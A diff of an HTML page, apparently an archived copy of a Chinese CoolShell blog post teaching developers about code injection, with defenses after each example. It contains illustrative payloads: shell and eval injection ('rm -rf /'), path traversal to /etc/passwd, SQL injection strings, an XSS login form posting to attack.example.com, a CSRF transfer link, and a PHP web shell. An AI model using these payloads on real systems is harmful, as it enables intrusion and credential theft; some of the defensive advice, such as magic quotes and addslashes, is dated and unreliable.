@@ -1,17 +1,17 @@
-<p><img alt="" class="alignright  wp-image-8730" height="206" src="https://coolshell.cn/wp-content/uploads/2012/12/200906020837401710.jpg" title="程序员疫苗" width="245" />几个月在<a href="http://weibo.com/haeol" target="_blank">我的微博</a>上说过要建一个程序员疫苗网站，希望大家一起来提交一些错误示例的代码，来帮助我们新入行的程序员，不要让我们的程序员一代又一代的再重复地犯一些错误。很多程序上错误就像人类世界的病毒一样，我们应该给我们的新入行的程序员注射一些疫苗，就像给新生儿打疫苗一样，希望程序员从入行时就对这些错误有抵抗力。</p>
+<html><body><p><img alt="" class="alignright wp-image-8730" height="206" src="../wp-content/uploads/2012/12/200906020837401710.jpg" title="程序员疫苗" width="245"/>几个月在<a href="http://weibo.com/haeol" target="_blank">我的微博</a>上说过要建一个程序员疫苗网站，希望大家一起来提交一些错误示例的代码，来帮助我们新入行的程序员，不要让我们的程序员一代又一代的再重复地犯一些错误。很多程序上错误就像人类世界的病毒一样，我们应该给我们的新入行的程序员注射一些疫苗，就像给新生儿打疫苗一样，希望程序员从入行时就对这些错误有抵抗力。</p>
 <p>我的那个疫苗网站正在建议中（不好意思拖了很久），不过，我可以先写一些关于程序员疫苗性质的文章，也算是热热身。希望大家喜欢，先向大家介绍第一注疫苗——代码注入。</p>
 <h4>Shell注入</h4>
 <p>我们先来看一段perl的代码：</p>
-<p>[perl]use CGI qw(:standard);<br />
-$name = param(&#8216;name&#8217;);<br />
-$nslookup = &quot;/path/to/nslookup&quot;;<br />
-print header;<br />
-if (open($fh, &quot;$nslookup $name|&quot;)) {<br />
-    while (&lt;$fh&gt;) {<br />
-        print escapeHTML($_);<br />
-        print &quot;&lt;br&gt;\n&quot;;<br />
-    }<br />
-    close($fh);<br />
+<p>[perl]use CGI qw(:standard);<br/>
+$name = param(‘name’);<br/>
+$nslookup = "/path/to/nslookup";<br/>
+print header;<br/>
+if (open($fh, "$nslookup $name|")) {<br/>
+    while (&lt;$fh&gt;) {<br/>
+        print escapeHTML($_);<br/>
+        print "&lt;br&gt;\n";<br/>
+    }<br/>
+    close($fh);<br/>
 }[/perl]</p>
 <p>如果用户输入的参数是：</p>
 <p><code class="EnlighterJSRAW">coolshell.cn%20%3B%20/bin/ls%20-l</code></p>
@@ -19,10 +19,10 @@ if (open($fh, &quot;$nslookup $name|&quot;)) {<br />
 <p><span id="more-8711"></span></p>
 <p><code class="EnlighterJSRAW">/path/to/nslookup coolshell.cn ; /bin/ls -l</code></p>
 <p>我们再来看一段PHP的程序：</p>
-<pre class="EnlighterJSRAW">$myvar = &#039;somevalue&#039;;
-$x = $_GET[&#039;arg&#039;];
-eval(&#039;$myvar = &#039; . $x . &#039;;&#039;);</pre>
-<p>&#8220;<code>eval</code>&#8220;的参数将会视同PHP处理，所以额外的命令可被添加。例如：如果&#8221;arg&#8221;如果被设成&#8221;<code>10; system('rm -rf /')</code>&#8220;，后面的&#8221;<code>system('rm -rf /')</code>&#8220;代码将被运行，这等同在服务器上运行开发者意料外的程序。（关于rm -rf /，你懂的，可参看“<a href="https://coolshell.cn/articles/4875.html" target="_blank" title="一个空格引发的惨剧">一个空格引发的悲剧</a>”）</p>
+<pre class="EnlighterJSRAW">$myvar = 'somevalue';
+$x = $_GET['arg'];
+eval('$myvar = ' . $x . ';');</pre>
+<p>“<code>eval</code>“的参数将会视同PHP处理，所以额外的命令可被添加。例如：如果”arg”如果被设成”<code>10; system('rm -rf /')</code>“，后面的”<code>system('rm -rf /')</code>“代码将被运行，这等同在服务器上运行开发者意料外的程序。（关于rm -rf /，你懂的，可参看“<a href="https://coolshell.cn/articles/4875.html" target="_blank" title="一个空格引发的惨剧">一个空格引发的悲剧</a>”）</p>
 <p>再来看一个PHP的代码</p>
 <pre class="EnlighterJSRAW">$isadmin= false;
 ...
@@ -30,17 +30,17 @@ eval(&#039;$myvar = &#039; . $x . &#039;;&#039;);</pre>
 foreach ($_GET as $key =&gt; $value) {
   $$key = $value;
 }</pre>
-<p>如果攻击者在查询字符串中给定&#8221;isadmin=1&#8243;，那$isadmin将会被设为值 &#8220;1&#8221;，然后攻击值就取得了网站应用的admin权限了。</p>
+<p>如果攻击者在查询字符串中给定”isadmin=1″，那$isadmin将会被设为值 “1”，然后攻击值就取得了网站应用的admin权限了。</p>
 <p>再来看一个PHP的示例：</p>
-<pre class="EnlighterJSRAW">$action = &#039;login&#039;;
-   if (__isset( $_GET[&#039;act&#039;] ) )
-      $action = $_GET[&#039;act&#039;];
-   require( $action . &#039;.php&#039; ); </pre>
+<pre class="EnlighterJSRAW">$action = 'login';
+   if (__isset( $_GET['act'] ) )
+      $action = $_GET['act'];
+   require( $action . '.php' ); </pre>
 <p>这个代码相当危险，攻击者有可能可以干这些事：</p>
 <ul>
-<li><code>/test.php?act=<strong>http://evil/exploit</strong></code> &#8211; 注入远程机器上有漏洞的文件。</li>
-<li><code>/test.php?act=<strong>/home/www/bbs/upload/exploit</strong></code> &#8211; 从一个已经上载、叫做exploit.php文件运行其代码。</li>
-<li><code>/test.php?act=<strong>../../../../etc/passwd%00</strong></code> &#8211; 让攻击者取得该UNIX系统目录检索下密码文件的内容。一个使用空元字符以解除<code>.php</code>扩展名限制，允许访问其他非 .php 结尾文件。 (PHP默认值&#8221;magic_quotes_gpc = On&#8221;可以终止这种攻击)</li>
+<li><code>/test.php?act=<strong>http://evil/exploit</strong></code> – 注入远程机器上有漏洞的文件。</li>
+<li><code>/test.php?act=<strong>/home/www/bbs/upload/exploit</strong></code> – 从一个已经上载、叫做exploit.php文件运行其代码。</li>
+<li><code>/test.php?act=<strong>../../../../etc/passwd%00</strong></code> – 让攻击者取得该UNIX系统目录检索下密码文件的内容。一个使用空元字符以解除<code>.php</code>扩展名限制，允许访问其他非 .php 结尾文件。 (PHP默认值”magic_quotes_gpc = On”可以终止这种攻击)</li>
 </ul>
 <p>这样的示例有很多，只要你的程序有诸如：<code>system()</code>、<code>StartProcess()</code>、<code>java.lang.Runtime.exec()</code>、<code>System.Diagnostics.Process.Start()</code>以及类似的应用程序接口，都是比较危险的，最好不要让其中的字符串去拼装用户的输入。</p>
 <p>PHP提供<code><a href="http://www.php.net/manual/en/function.escapeshellarg.php" rel="nofollow">escapeshellarg()</a></code>和<code><a href="http://www.php.net/manual/en/function.escapeshellcmd.php" rel="nofollow">escapeshellcmd()</a></code>以在调用方法以前进行编码。然而，实际上并不建议相信这些方法是安全的 。</p>
@@ -57,53 +57,53 @@ foreach ($_GET as $key =&gt; $value) {
 <p>某个网站的登录验证的SQL查询代码为</p>
 <div dir="ltr">
 <div>
-<pre class="EnlighterJSRAW">strSQL = &quot;SELECT * FROM users
-WHERE (name = &#039;&quot; + userName + &quot;&#039;) and (pw = &#039;&quot;+ passWord +&quot;&#039;);&quot;</pre>
+<pre class="EnlighterJSRAW">strSQL = "SELECT * FROM users
+WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"</pre>
 </div>
 </div>
 <p>用户在登录时恶意输入如下的的用户名和口令：</p>
 <div dir="ltr">
-<div><code class="EnlighterJSRAW">userName = &quot;&#039; OR &#039;1&#039;=&#039;1&quot;;</code></p>
+<div><code class="EnlighterJSRAW">userName = "' OR '1'='1";</code>
 </div>
 </div>
 <div dir="ltr">
-<div><code class="EnlighterJSRAW">passWord = &quot;&#039; OR &#039;1&#039;=&#039;1&quot;;</code></p>
+<div><code class="EnlighterJSRAW">passWord = "' OR '1'='1";</code>
 </div>
 </div>
 <p>此时，将导致原本的SQL字符串被解析为：</p>
 <div dir="ltr">
 <div>
-<pre class="EnlighterJSRAW">strSQL = &quot;SELECT * FROM users
-WHERE (name = &#039;&#039; OR &#039;1&#039;=&#039;1&#039;) and (pw = &#039;&#039; OR &#039;1&#039;=&#039;1&#039;);&quot;</pre>
+<pre class="EnlighterJSRAW">strSQL = "SELECT * FROM users
+WHERE (name = '' OR '1'='1') and (pw = '' OR '1'='1');"</pre>
 </div>
 </div>
 <p>也就是实际上运行的SQL命令会变成下面这样的，因此导致无帐号密码，也可登录网站。</p>
 <div dir="ltr">
-<div><code class="EnlighterJSRAW">strSQL = &quot;SELECT * FROM users;&quot;</code></p>
+<div><code class="EnlighterJSRAW">strSQL = "SELECT * FROM users;"</code>
 </div>
 </div>
 <p>这还不算恶劣的，真正恶劣的是在你的语句后再加一个自己的语句，如：</p>
-<p><code class="EnlighterJSRAW">username= &quot;&#039; ; DELETE FROM users; --&quot;;</code></p>
+<p><code class="EnlighterJSRAW">username= "' ; DELETE FROM users; --";</code></p>
 <p>这样一来，要么整个数据库的表被人盗走，要么被数据库被删除。</p>
 <p><strong>所以SQL注入攻击被俗称为黑客的填空游戏</strong>。你是否还记得酷壳<a href="https://coolshell.cn/articles/6639.html" target="_blank" title="千万别惹程序员">这篇文章里的SQL注入</a>？</p>
-<p><img alt="" class="aligncenter" height="407" src="https://coolshell.cn//wp-content/uploads/2012/02/SQL-injection-attackadjusted.jpg" title="SQL-injection-attack(adjusted)" width="600" /></p>
+<p><img alt="" class="aligncenter" height="407" src="../wp-content/uploads/2012/02/SQL-injection-attackadjusted.jpg" title="SQL-injection-attack(adjusted)" width="600"/></p>
 <p>当他们发现一个网站有SQL注入的时候，他们一般会干下面的事：</p>
 <ul>
 <li>盗取数据表中的数据，例如个人机密数据（信用卡，身份证，手机号，通讯录……），帐户数据，密码等，获得用户的数据和信息后对这些用户进行“社会工程学”活动（如：<a href="https://coolshell.cn/articles/8638.html" target="_blank" title="为什么不能用微信或米聊这类的软件">我前两天在微信上亲身经历</a>）。</li>
 </ul>
 <ul>
-<li>取得系统管理员权限（例如ALTER LOGIN sa WITH PASSWORD=&#8217;xxxxxx&#8217;）。</li>
+<li>取得系统管理员权限（例如ALTER LOGIN sa WITH PASSWORD=’xxxxxx’）。</li>
 </ul>
 <ul>
 <li>在数据库中的数据中插入一些HTML/JS代码，有可能得以在网页加入恶意链接以及XSS，这样一来就让访问者被黑。</li>
 </ul>
 <ul>
-<li>经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如：MS SQL Server的 xp_cmdshell &#8220;net stop iisadmin&#8221;可停止服务器的IIS服务）。甚至破坏硬盘数据，瘫痪全系统（例如xp_cmdshell &#8220;FORMAT C:&#8221;）。</li>
+<li>经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如：MS SQL Server的 xp_cmdshell “net stop iisadmin”可停止服务器的IIS服务）。甚至破坏硬盘数据，瘫痪全系统（例如xp_cmdshell “FORMAT C:”）。</li>
 </ul>
 <div>现在的黑客比较坏，瘫痪系统的事，他们干的越来越少，因为没什么利益，他们希望通过获取用户的帐号信息后，转而攻击用户别的帐号，如游戏帐号，网银帐号，QQ帐号等等他们可以获利的事情（这就是为什么我希望大家<a href="https://coolshell.cn/articles/2428.html" target="_blank" title="如何管理并设计你的口令">在不站点上使用不同的口令</a>，甚至不同的用户信息的原因）</div>
 <p><strong>如何避免</strong></p>
 <ul>
-<li>在组合SQL字符串时，先针对所传入的参数作字符转义（如：将单引号字符取代为连续2个单引号字符）。如果使用PHP开发网页程序的话，亦可打开PHP的Magic quote功能自动将所有的网页传入参数，将单引号字符取代为连续2个单引号字符。<strong>如果可能应该过滤以下字符：分号“;”，两个减号“&#8211;”，单引号“&#8217;”，注释“/* &#8230; */”</strong>。（当然，因为注入攻击一般用闭合的引号来玩，所以把引号转义了应该就没有什么问题了）</li>
+<li>在组合SQL字符串时，先针对所传入的参数作字符转义（如：将单引号字符取代为连续2个单引号字符）。如果使用PHP开发网页程序的话，亦可打开PHP的Magic quote功能自动将所有的网页传入参数，将单引号字符取代为连续2个单引号字符。<strong>如果可能应该过滤以下字符：分号“;”，两个减号“–”，单引号“’”，注释“/* … */”</strong>。（当然，因为注入攻击一般用闭合的引号来玩，所以把引号转义了应该就没有什么问题了）</li>
 </ul>
 <ul>
 <li>更换危险字符。例如在PHP通过<code>addslashes()</code>函数保护SQL注入。</li>
@@ -121,29 +121,29 @@ WHERE (name = &#039;&#039; OR &#039;1&#039;=&#039;1&#039;) and (pw = &#039;&#039
 <h4>跨网站脚本注 入</h4>
 <p><strong>跨网站脚本</strong>（<strong>Cross-site</strong> scripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java， VBScript， ActiveX， Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
 <p>假如我们有这样一段PHP的代码：</p>
-<pre class="EnlighterJSRAW">$username = $_GET[&#039;username&#039;];
-echo &#039;&lt;div&gt; Welcome, &#039; . $username . &#039;&lt;/div&gt;&#039;;</pre>
+<pre class="EnlighterJSRAW">$username = $_GET['username'];
+echo '&lt;div&gt; Welcome, ' . $username . '&lt;/div&gt;';</pre>
 <p>那么我们可以这样来注入：</p>
-<div style="color: #1b00aa; background-color: #efefef; font-size: 90%; padding: 10px;">http://trustedSite.example.com/welcome.php?username=&lt;Script Language=&#8221;Javascript&#8221;&gt;alert(&#8220;You&#8217;ve been attacked!&#8221;);&lt;/Script&gt;</div>
+<div style="color: #1b00aa; background-color: #efefef; font-size: 90%; padding: 10px;">http://trustedSite.example.com/welcome.php?username=&lt;Script Language=”Javascript”&gt;alert(“You’ve been attacked!”);&lt;/Script&gt;</div>
 <p>甚至这样：</p>
-<div style="color: #1b00aa; background-color: #efefef; font-size: 90%; padding: 10px;">http://trustedSite.example.com/welcome.php?username=&lt;div id=&#8221;stealPassword&#8221;&gt;Please Login:&lt;form name=&#8221;input&#8221; action=&#8221;http://attack.example.com/stealPassword.php&#8221; method=&#8221;post&#8221;&gt;Username: &lt;input type=&#8221;text&#8221; name=&#8221;username&#8221; /&gt;&lt;br/&gt;Password: &lt;input type=&#8221;password&#8221; name=&#8221;password&#8221; /&gt;&lt;input type=&#8221;submit&#8221; value=&#8221;Login&#8221; /&gt;&lt;/form&gt;&lt;/div&gt;</div>
+<div style="color: #1b00aa; background-color: #efefef; font-size: 90%; padding: 10px;">http://trustedSite.example.com/welcome.php?username=&lt;div id=”stealPassword”&gt;Please Login:&lt;form name=”input” action=”http://attack.example.com/stealPassword.php” method=”post”&gt;Username: &lt;input type=”text” name=”username” /&gt;&lt;br/&gt;Password: &lt;input type=”password” name=”password” /&gt;&lt;input type=”submit” value=”Login” /&gt;&lt;/form&gt;&lt;/div&gt;</div>
 <p>这会让网页显示以下内容：</p>
 <pre class="EnlighterJSRAW">
-&lt;div class=&quot;header&quot;&gt; Welcome,
-    &lt;div id=&quot;stealPassword&quot;&gt;Please Login:
-        &lt;form name=&quot;input&quot; action=&quot;attack.example.com/stealPassword.php&quot; method=&quot;post&quot;&gt;
-            Username: &lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;
+&lt;div class="header"&gt; Welcome,
+    &lt;div id="stealPassword"&gt;Please Login:
+        &lt;form name="input" action="attack.example.com/stealPassword.php" method="post"&gt;
+            Username: &lt;input type="text" name="username" /&gt;
             &lt;br/&gt;
-            Password: &lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;
-            &lt;input type=&quot;submit&quot; value=&quot;Login&quot; /&gt;
+            Password: &lt;input type="password" name="password" /&gt;
+            &lt;input type="submit" value="Login" /&gt;
         &lt;/form&gt;
     &lt;/div&gt;
 &lt;/div&gt;
 </pre>
 <p>注入的代码还有可能变种为如下这种更为隐蔽的方式(unicode码)：</p>
 <div style="color: #1b00aa; background-color: #efefef; font-size: 90%; padding: 10px;">
-<div>trustedSite.example.com/welcome.php?username=&lt;script+type=&#8221;text/javascript&#8221;&gt;</div>
-<div>document.write(&#8216;\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073</div>
+<div>trustedSite.example.com/welcome.php?username=&lt;script+type=”text/javascript”&gt;</div>
+<div>document.write(‘\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073</div>
 <div>\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064</div>
 <div>\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067</div>
 <div>\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D</div>
@@ -165,7 +165,7 @@ echo &#039;&lt;div&gt; Welcome, &#039; . $username . &#039;&lt;/div&gt;&#039;;</
 <div>\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D</div>
 <div>\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C</div>
 <div>\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F</div>
-<div>\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D&#8217;);&lt;/script&gt;</div>
+<div>\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D’);&lt;/script&gt;</div>
 </div>
 <p><strong>XSS的攻击主要是通过一段JS程序得用用户已登录的cookie去模拟用户的操作（甚至偷用户的cookie）</strong>。这个方式可以让用户在自己不知情的情况下操作了自己不期望的操作。如果是网站的管理员中招，还有可能导致后台管理权限被盗。关于其中的一些细节可以参看《<a href="https://coolshell.cn/articles/4914.html" target="_blank" title="新浪微博的XSS攻击">新浪微博的XSS攻击</a>》一文。XSS攻击是程序员有一糊涂就很容易犯的错误，你还可以看看网上的《<a href="http://www.cnblogs.com/kingthy/archive/2011/08/20/2147355.html" target="_blank">腾讯微博的XSS攻击</a>》。</p>
 <p>XSS攻击在论坛的用户签档里面（使用img标签）也发生过很多次，包括像一些使用bcode的网站，很有可能会被注入一些可以被浏览器用来执行的代码。包括CSS都有可能被注入javascript代码。</p>
@@ -178,7 +178,7 @@ echo &#039;&lt;div&gt; Welcome, &#039; . $username . &#039;&lt;/div&gt;&#039;;</
 &lt;img src=”javascript:alert(1)”&gt;</pre>
 <p>XSS攻击通常会引发CSRF攻击。CSRF攻击主要是通过在A站上设置B站点上的链接，通过使用用户在B站点上的登录且还没有过期的cookie，从而使得用户的B站点被攻击。（这得益于现在的多Tab页的浏览器，大家都会同时打开并登录很多的网站，而这些不同网站的页面间的cookie又是共享的）</p>
 <p>于是，如果我在A站点内的某个贴子内注入这么一段代码：</p>
-<p><code class="EnlighterJSRAW">&lt;img src=&quot;http://bank.example.com/transfer?account=XXX&amp;amount=1000000&amp;for=haoel&quot;&gt;</code></p>
+<p><code class="EnlighterJSRAW">&lt;img src="http://bank.example.com/transfer?account=XXX&amp;amount=1000000&amp;for=haoel"&gt;</code></p>
 <p>很有可能你就在访问A站的这个贴子时，你的网银可能向我转了一些钱。</p>
 <p><strong>如何避免</strong></p>
 <p>要防止XSS攻击，一般来说有下面几种手段：</p>
@@ -209,23 +209,23 @@ echo &#039;&lt;div&gt; Welcome, &#039; . $username . &#039;&lt;/div&gt;&#039;;</
 <h4>上传文件</h4>
 <p>上传文件是一个很危险的功能，尤其是你如果不校验上传文件的类型的话，你可能会中很多很多的招，这种攻击相当狠。<strong>试想，如果用户上传给你一个PHP、ASP、JSP的文件，当有人访问这个文件时，你的服务器会解释执行之，这就相当于他可以在你的服务器上执行一段程序。这无疑是相当危险的。</strong></p>
 <p>举个例子：</p>
-<pre class="EnlighterJSRAW">&lt;form action=&quot;upload_picture.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+<pre class="EnlighterJSRAW">&lt;form action="upload_picture.php" method="post" enctype="multipart/form-data"&gt;
 要上传的文件:
-&lt;input type=&quot;file&quot; name=&quot;filename&quot;/&gt;
+&lt;input type="file" name="filename"/&gt;
 &lt;br/&gt;
-&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot;/&gt;
+&lt;input type="submit" name="submit" value="Submit"/&gt;
 &lt;/form&gt;
 </pre>
-<p>&nbsp;</p>
-<pre class="EnlighterJSRAW">$target = &quot;pictures/&quot; . basename($_FILES[&#039;uploadedfile&#039;][&#039;name&#039;]);
-if(move_uploaded_file($_FILES[&#039;uploadedfile&#039;][&#039;tmp_name&#039;], $target)){
-    echo &quot;图片文件上传成功&quot;;
+<p> </p>
+<pre class="EnlighterJSRAW">$target = "pictures/" . basename($_FILES['uploadedfile']['name']);
+if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target)){
+    echo "图片文件上传成功";
 }else{&lt;/div&gt;
-    echo &quot;图片文件上传失败&quot;;
+    echo "图片文件上传失败";
 }</pre>
 <p>假如我上传了一个PHP文件如下：</p>
 <pre class="EnlighterJSRAW">&lt;?php
-system($_GET[&#039;cmd&#039;]);
+system($_GET['cmd']);
 ?&gt;</pre>
 <p>那么，我就可以通过如下的URL访问攻击你的网站了：</p>
 <p><code class="EnlighterJSRAW">http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l</code></p>
@@ -235,8 +235,8 @@ system($_GET[&#039;cmd&#039;]);
 <h4>URL跳转</h4>
 <p>URL跳转很有可能会成为攻击利用的工具。</p>
 <p>比如下面的PHP代码：</p>
-<pre class="EnlighterJSRAW">$redirect_url = $_GET[&#039;url&#039;];
-header(&quot;Location: &quot; . $redirect_url);</pre>
+<pre class="EnlighterJSRAW">$redirect_url = $_GET['url'];
+header("Location: " . $redirect_url);</pre>
 <p>这样的代码可能很常见，比如当用户在访问你的网站某个页观的时候没有权限，于是你的网站跳转到登录页面，当然登录完成后又跳转回刚才他访问的那个页面。一般来说，我们都会在跳转到登录页面时在URL里加上要被跳转过去的网页。于是会出现上述那样的代码。</p>
 <p>于是我们就可以通过下面的URL，跳转到一个恶意网站上，而那个网站上可能有一段CSRF的代码在等着你，或是一个钓鱼网站。</p>
 <p><code class="EnlighterJSRAW">http://bank.example.com/redirect?url=http://attacker.example.net</code></p>
@@ -260,7 +260,6 @@ header(&quot;Location: &quot; . $redirect_url);</pre>
 
 --></p>
 <div style="margin-top: 15px; font-size: 16px; color: #cc0000;">
-<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
 </div>
-
-<div class="wp_rp_wrap  wp_rp_vertical_m"><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/18094.html"><img alt="如何免费的让网站启用HTTPS" height="150" src="https://coolshell.cn/wp-content/uploads/2017/08/enable-https-banner-150x150.png" width="150" /></a><a class="wp_rp_title" href="https://coolshell.cn/articles/18094.html">如何免费的让网站启用HTTPS</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/11021.html"><img alt="从“黑掉Github”学Web安全开发" height="150" src="https://coolshell.cn/wp-content/uploads/2014/02/Github-Security-150x150.png" width="150" /></a><a class="wp_rp_title" href="https://coolshell.cn/articles/11021.html">从“黑掉Github”学Web安全开发</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/6043.html"><img alt="Web开发中需要了解的东西" height="150" src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/30.jpg" width="150" /></a><a class="wp_rp_title" href="https://coolshell.cn/articles/6043.html">Web开发中需要了解的东西</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/5987.html"><img alt="如何设计“找回用户帐号”功能" height="150" src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/12.jpg" width="150" /></a><a class="wp_rp_title" href="https://coolshell.cn/articles/5987.html">如何设计“找回用户帐号”功能</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/5353.html"><img alt="你会做Web上的用户登录功能吗？" height="150" src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg" width="150" /></a><a class="wp_rp_title" href="https://coolshell.cn/articles/5353.html">你会做Web上的用户登录功能吗？</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/21708.html"><img alt="网络数字身份认证术" height="150" src="https://coolshell.cn/wp-content/uploads/2022/01/iStock-1175502114-150x150.png" width="150" /></a><a class="wp_rp_title" href="https://coolshell.cn/articles/21708.html">网络数字身份认证术</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/8711.html">程序员疫苗：代码注入</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.
+<div class="wp_rp_wrap wp_rp_vertical_m"><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/18094.html"><img alt="如何免费的让网站启用HTTPS" height="150" src="../wp-content/uploads/2017/08/enable-https-banner-150x150.png" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/18094.html">如何免费的让网站启用HTTPS</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/11021.html"><img alt="从“黑掉Github”学Web安全开发" height="150" src="../wp-content/uploads/2014/02/Github-Security-150x150.png" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/11021.html">从“黑掉Github”学Web安全开发</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/6043.html"><img alt="Web开发中需要了解的东西" height="150" src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/30.jpg" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/6043.html">Web开发中需要了解的东西</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/5987.html"><img alt="如何设计“找回用户帐号”功能" height="150" src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/12.jpg" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/5987.html">如何设计“找回用户帐号”功能</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/5353.html"><img alt="你会做Web上的用户登录功能吗？" height="150" src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/5353.html">你会做Web上的用户登录功能吗？</a></li><li><a class="wp_rp_thumbnail" href="https://coolshell.cn/articles/21708.html"><img alt="网络数字身份认证术" height="150" src="../wp-content/uploads/2022/01/iStock-1175502114-150x150.png" width="150"/></a><a class="wp_rp_title" href="https://coolshell.cn/articles/21708.html">网络数字身份认证术</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/8711.html">程序员疫苗：代码注入</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.</body></html>
